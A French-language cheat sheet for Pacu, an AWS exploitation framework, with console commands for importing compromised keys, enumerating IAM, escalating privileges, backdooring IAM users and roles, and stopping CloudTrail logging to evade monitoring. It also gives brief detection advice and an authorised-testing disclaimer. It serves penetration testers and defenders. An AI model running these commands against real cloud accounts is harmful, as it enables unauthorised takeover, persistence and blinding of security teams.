<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Sécurité Cloud">
</p>

<p align="center">
  <b>☁️ Le cadre d'exploitation AWS open source conçu pour les tests d'intrusion dans les environnements cloud, l'élévation des privilèges, la collecte d'informations d'identification et la reconnaissance de l'infrastructure</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et architecture](#-overview--architecture)
- [Installation](#-installation)
- [Gestion de session et importation de clé AWS](#-session-management--aws-key-import)
  - [Importation d'informations d'identification compromises](#importing-compromis-credentials)
  - [Rôles supposés et jetons de session](#assumed-roles-and-session-tokens)
- [Modules de reconnaissance et d'énumération](#-reconnaissance--enumeration-modules)
  - [Énumération des autorisations IAM actuelles](#enumerating-current-iam-permissions)
  - [Analyse des instances EC2 et des compartiments S3](#scanning-ec2-instances--s3-buckets)
- [Techniques d'escalade de privilèges dans AWS](#-privilege-escalation-techniques-in-aws)
  - [Scanner automatique d'escalade de privilèges](#automatic-privilege-escalation-scanner)
  - [Exécution des modules d'escalade](#executing-escalation-modules)
- [Persistance et évasion de défense](#-persistence--défense-évasion)
  - [Rôles et utilisateurs IAM de porte dérobée](#backdooring-iam-roles--users)
  - [Perturbation de la journalisation CloudTrail](#disrupting-cloudtrail-logging)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et détection](#-considérations-defensives--détection)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et architecture

Créé par **Rhino Security Labs**, **Pacu** est le « Metasploit pour AWS ». Il est conçu pour imiter les tactiques contradictoires au sein des environnements Amazon Web Services.

Pacu fonctionne à l'aide d'une base de données SQLite locale qui maintient l'état tout au long des sessions offensives :
- **Pipeline modulaire :** Plus de 40 modules spécialisés couvrant la découverte, le mouvement latéral, l'élévation de privilèges, la persistance et l'exfiltration.
- **Énumération des autorisations :** analyse les stratégies IAM sans déclencher de seuils d'alerte en testant les actions de l'API ou en examinant les stratégies gérées attachées.
- **Privesc Automation :** évalue les chemins d'escalade des autorisations IAM connus (tels que `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥Installation
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Gestion de session et importation de clés AWS

Lorsque Pacu se lance, vous entrez dans une console interactive. Créez ou sélectionnez une session :
```text
Pacu > set_session client_assessment
```
### Importation d'identifiants compromis
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Rôles assumés et jetons de session
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Modules de reconnaissance et de dénombrement

### Énumération des autorisations IAM actuelles
Déterminez qui vous êtes et ce que les informations d'identification actives sont autorisées à faire :
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Analyse des instances EC2 et des compartiments S3
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Techniques d'escalade de privilèges dans AWS

L'élévation des privilèges AWS repose sur des politiques IAM mal configurées qui permettent aux utilisateurs non administratifs de s'accorder ou d'accorder à d'autres entités des droits administratifs.

### Scanner automatique d'élévation de privilèges
Analyse vos autorisations énumérées par rapport à plus de 21 vecteurs privés AWS documentés :
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Un exemple de sortie met en évidence les autorisations vulnérables telles que `iam:PutUserPolicy`, `iam:AttachUserPolicy` ou `iam:CreateAccessKey`.*

### Exécution de modules d'escalade
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Persistance et évasion défensive

### Rôles et utilisateurs IAM de porte dérobée
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Perturbation de la journalisation CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande Pacu |
|-----------|--------------|
| **Définir/Sélectionner une session** | `set_session <NAME>` |
| **Importer les informations d'identification AWS** | `set_keys` |
| **Afficher l'identité actuelle** | `whoami` |
| **Énumérer les droits IAM** | `run iam__enum_permissions` |
| **Rechercher des vecteurs Privesc** | `run iam__privesc_scan` |
| **Énumérer les compartiments S3** | `run s3__enum` |
| **Énumérer les instances EC2** | `run ec2__enum` |
| **Perturber CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Liste des modules disponibles** | `list` |

---

## 🛡️ Considérations défensives et détection

1. **GuardDuty et CloudTrail Monitoring :** L'escalade automatisée des privilèges et l'analyse des autorisations de Pacu génèrent des requêtes API séquentielles rapides facilement signalées par AWS GuardDuty.
2. ** Limites de SCP et d'autorisation :** Appliquez les politiques de contrôle de service (SCP) d'AWS Organizations empêchant tout mandataire, y compris les administrateurs complets, de falsifier CloudTrail ou de modifier les structures de l'organisation racine.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Pacu est spécialement conçu pour les tests d'intrusion et les évaluations de sécurité AWS autorisés. Tester des comptes cloud sans l'autorisation préalable explicite du propriétaire de l'actif enfreint la politique d'utilisation acceptable d'Amazon Web Services et le droit international.